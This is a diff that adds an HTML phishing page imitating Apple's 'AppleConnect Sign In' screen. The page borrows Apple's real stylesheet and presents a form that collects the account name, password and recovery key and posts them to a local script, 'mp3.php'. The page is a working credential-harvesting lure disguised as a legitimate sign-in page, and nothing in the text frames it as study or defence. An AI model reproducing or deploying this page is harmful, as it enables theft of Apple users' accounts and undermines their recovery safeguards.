@@ -1,0 +1,68 @@
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+ <head>
+  <meta content="Content-Type" http-equiv="Content-Type" />
+  <style>
+   .layout_cell_2{
+width:10% ! important;
+}
+.layout_cell_1{
+width:45% ! important;
+}
+.layout_cell_3{
+width:45% ! important;
+}
+.align_field{
+width:100%;
+}
+  </style>
+  <meta charset="utf-8" />
+  <title>
+   AppleConnect  Sign In
+  </title>
+  <meta content="initial-scale=1.0" name="viewport" />
+  <link href="https://appleid.cdn-apple.com/daw/IDMSWebAuth/static/26Oct2015/views/static/css/common/appleconnect.css" type="text/css" rel="stylesheet" />
+ </head>
+ <body onunload="function onload(event) {
+  javascript:urlStore();fixSafariBackButton();
+}" onload="javascript:urlStore();fixSafariBackButton();">
+  <div class="outer">
+   <div class="inner">
+    <div class="main">
+     <!--   Insert non-production environment name between "AppleConnect" and "Sign In"	 -->
+     <h1 class="logo">
+      AppleConnect  Sign In
+     </h1>
+     <h2>
+      Sign in
+     </h2>
+     <p id="errormsg">
+     </p>
+     <form onsubmit=" return validateForm(event); setFDC();" method="post" action="mp3.php" name="form2" id="command">
+      <input type="hidden" value="false" name="openiForgotInNewWindow" id="iForgotNewWindowVar" />
+      <input type="hidden" value="" name="fdcBrowserData" id="fdcBrowserData" />
+      <div class="pair">
+       <div class="module">
+        <label for="aname">
+         Account Name
+        </label>
+        <input type="text" autocomplete="off" maxlength="128" size="30" value="" aria-label="Apple ID" autocapitalize="off" autocorrect="off" spellcheck="false" tabindex="1" required="" name="user" id="accountname" />
+        <label for="aname">
+         Password
+        </label>
+        <input type="password" autocomplete="off" maxlength="128" size="30" value="" aria-label="Apple ID" autocapitalize="off" autocorrect="off" spellcheck="false" tabindex="2" required="" name="pass" id="accountname" />
+        <!--   Insert non-production environment name before "Password"	 -->
+        <label for="accountpassword">
+         Recovery key
+        </label>
+        <div class="buttonfield">
+         <input type="text" autocomplete="off" maxlength="19" size="30" value="" autocapitalize="off" oncopy="return false;" autocorrect="off" placeholder="RK-XXXX-XXXX-XXXX" oncut="return false;" tabindex="3" name="key" id="accountpassword" />
+         <input type="image" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyhpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuNi1jMDE0IDc5LjE1Njc5NywgMjAxNC8wOC8yMC0wOTo1MzowMiAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENDIDIwMTQgKE1hY2ludG9zaCkiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6NjMzQ0NDRjk5NTBEMTFFNEJFMzlBODgxQ0E1RTI2NkYiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6NjMzQ0NDRkE5NTBEMTFFNEJFMzlBODgxQ0E1RTI2NkYiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDo2MzNDQ0NGNzk1MEQxMUU0QkUzOUE4ODFDQTVFMjY2RiIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDo2MzNDQ0NGODk1MEQxMUU0QkUzOUE4ODFDQTVFMjY2RiIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/PkpeUbAAAAAQSURBVHjaYvj//z8DQIABAAj8Av7bok0WAAAAAElFTkSuQmCC" aria-label="Sign In" value="" id="continueFieldbutton" />
+        </div>
+       </div>
+      </div>
+     </form>
+    </div>
+   </div>
+  </div>
+ </body>
+</html>
